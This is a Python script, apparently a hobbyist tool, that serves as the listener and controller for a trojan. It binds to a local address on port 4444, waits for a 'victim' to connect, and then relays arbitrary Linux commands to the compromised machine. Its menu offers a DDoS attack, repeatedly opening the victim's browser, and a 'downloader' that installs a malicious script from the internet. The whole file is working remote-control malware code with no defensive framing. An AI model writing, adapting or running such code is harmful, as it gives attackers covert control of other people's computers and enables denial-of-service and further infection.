#!/usr/bin/python3

import socket
import sys

class server:
    # Initialization of Socket
    def __init__(self):
        self.host = '192.168.176.130'
        self.port = 4444
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("TTTTTTTTTTTTTTTTTTTTTTT                                      jjjj                                    ")
        print("T:::::::::::::::::::::T                                     j::::j                                   ")
        print("T:::::::::::::::::::::T                                      jjjj                                    ")
        print("T:::::TT:::::::TT:::::T                                                                              ")
        print("TTTTTT  T:::::T  TTTTTTrrrrr   rrrrrrrrr      ooooooooooo  jjjjjjj  aaaaaaaaaaaaa  nnnn  nnnnnnnn    ")
        print("        T:::::T        r::::rrr:::::::::r   oo:::::::::::ooj:::::j  a::::::::::::a n:::nn::::::::nn  ")
        print("        T:::::T        r:::::::::::::::::r o:::::::::::::::oj::::j  aaaaaaaaa:::::an::::::::::::::nn ")
        print("        T:::::T        rr::::::rrrrr::::::ro:::::ooooo:::::oj::::j           a::::ann:::::::::::::::n")
        print("        T:::::T         r:::::r     r:::::ro::::o     o::::oj::::j    aaaaaaa:::::a  n:::::nnnn:::::n")
        print("        T:::::T         r:::::r     rrrrrrro::::o     o::::oj::::j  aa::::::::::::a  n::::n    n::::n")
        print("        T:::::T         r:::::r            o::::o     o::::oj::::j a::::aaaa::::::a  n::::n    n::::n")
        print("        T:::::T         r:::::r            o::::o     o::::oj::::ja::::a    a:::::a  n::::n    n::::n")
        print("      TT:::::::TT       r:::::r            o:::::ooooo:::::oj::::ja::::a    a:::::a  n::::n    n::::n")
        print("      T:::::::::T       r:::::r            o:::::::::::::::oj::::ja:::::aaaa::::::a  n::::n    n::::n")
        print("      T:::::::::T       r:::::r             oo:::::::::::oo j::::j a::::::::::aa:::a n::::n    n::::n")
        print("      TTTTTTTTTTT       rrrrrrr               ooooooooooo   j::::j  aaaaaaaaaa  aaaa nnnnnn    nnnnnn")
        print("                                                            j::::j                                   ")
        print("                                                  jjjj      j::::j                                   ")
        print("                                                 j::::jj   j:::::j                                   ")
        print("                                                 j::::::jjj::::::j                                   ")
        print("                                                  jj::::::::::::j                                    ")
        print("                                                    jjj::::::jjj                                     ")
        print("                                                       jjjjjj                                        ")

        print('\n[+] Waiting for Victim to Run Trojan ...')


    # Bind Self Address and Self Port
    def bind(self):
        self.server.bind((self.host, self.port))
        self.server.listen(1)

    # Establish connection with Victim Machine
    def accept(self):
        client, addr = self.server.accept()
        self.client = client
        self.addr = addr
        print('[+] Session Created From ', self.addr)
        print('\nEnter Linux Commands to run on Victim Machine\n')
        print('\t\tor\n')
        print('''\nEnter from Following:\n
1. Enter \"ddos\" for DDOS Attack
2. Enter \"open 10\" for Open Browser on Victim Machine 10 Times
3. Enter \"downloader\" for Installing Malcious Script From Internet
4. Type \"exit()\" to Exit the Script\n''')

    # Send Commands to Victim Machine
    def send(self,data):
        self.client.send(data.encode('UTF-8'))

    # Receive Response from Victim Machine
    def recv(self):
        self.msg = self.client.recv(20400).decode('UTF-8')
        return self.msg

def main():
    serv = server()
    serv.bind()
    serv.accept()
    run = True

    while run:
        try:
            client_response = serv.recv()
            data = input(client_response)

            if data == 'exit()':
                print('\n[+] Session Closed by Host...\n[+] Good Bye...\n')
                serv.send(data)
                sys.exit(0)

            else:
                serv.send(data)
                print(serv.recv())

        except ConnectionResetError:
            print('\nClient lost. Try to connect......')
            serv.accept()

if __name__ == '__main__':
    main()
